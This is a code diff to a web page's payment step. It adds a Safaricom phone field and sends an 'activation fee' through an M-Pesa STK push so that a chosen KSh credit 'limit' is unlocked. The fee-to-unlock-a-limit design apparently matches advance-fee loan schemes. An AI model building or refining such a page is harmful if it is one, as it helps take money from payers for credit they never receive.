@@ -170,6 +170,11 @@
             <h2>Complete Your Payment</h2>
             <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">75,000</span></span></div>
             <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>
+            <div class="form-group" style="margin-top: 10px;">
+                <label>Safaricom Phone Number</label>
+                <input type="tel" id="payPhone" placeholder="07XXXXXXXX or 01XXXXXXXX">
+                <div class="error" id="payPhoneError"></div>
+            </div>
             <button id="payBtn" class="btn" onclick="paySTK()">Proceed to Pay</button>
         </div>
     </div>
@@ -190,7 +195,6 @@
 <script>
 let selectedLimit = 0, selectedFee = 0;
 let userData = {};
-const API_URL = "";
 
 // GENERATE LIMITS: 5000, 9000, 12000, THEN +4000 TO 160000. FEE: 300 +150 EACH
 function generateLimits() {
@@ -198,13 +202,11 @@ function generateLimits() {
     const limits = [5000, 9000, 12000];
     let fee = 300;
 
-    // Add first 3
     limits.forEach(l => {
         addLimitOption(container, l, fee);
         fee += 150;
     });
 
-    // Continue adding 4000 until 160000
     let nextLimit = 16000;
     while(nextLimit <= 160000) {
         addLimitOption(container, nextLimit, fee);
@@ -302,15 +304,55 @@ function selectLimit(limit, fee){
     setTimeout(()=>show(4), 300);
 }
 
+// CONNECTED TO YOUR server.js /pay ROUTE
 async function paySTK(){
+    const phoneInput = document.getElementById('payPhone');
+    const phone = phoneInput.value;
+    document.getElementById('payPhoneError').style.display = 'none';
+
+    const phoneRegex = /^(07|01)\d{8}$/;
+    if(!phoneRegex.test(phone)){
+        document.getElementById('payPhoneError').innerText = 'Enter a valid Safaricom number: 07XXXXXXXX or 01XXXXXXXX';
+        document.getElementById('payPhoneError').style.display = 'block';
+        return;
+    }
+
+    let fullPhone = formatPhoneNumber(phone);
+    if(fullPhone) phoneInput.value = fullPhone;
+
     const btn = document.getElementById('payBtn');
     btn.disabled = true;
-    btn.innerText = 'Processing...';
-    alert(`STK Push will be sent for KSh ${selectedFee} to activate KSh ${selectedLimit} limit`);
-    document.getElementById('paidPhone').innerText = userData.phone;
-    show(5);
+    btn.innerText = 'Sending STK...';
+
+    try {
+        const response = await fetch(`/pay`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                phone: fullPhone,
+                amount: selectedFee,
+                limit: selectedLimit,
+                name: userData.name
+            })
+        });
+
+        const data = await response.json();
+
+        if(data.success){
+            document.getElementById('paidPhone').innerText = "0" + fullPhone.substring(3);
+            show(5);
+        } else {
+            alert('Error: ' + data.message);
+            btn.disabled = false;
+            btn.innerText = 'Proceed to Pay';
+        }
+    } catch(e){
+        alert('Network error. Please ensure server is online');
+        btn.disabled = false;
+        btn.innerText = 'Proceed to Pay';
+    }
 }
 
 </script>
 </body>
-  </html>
+</html>
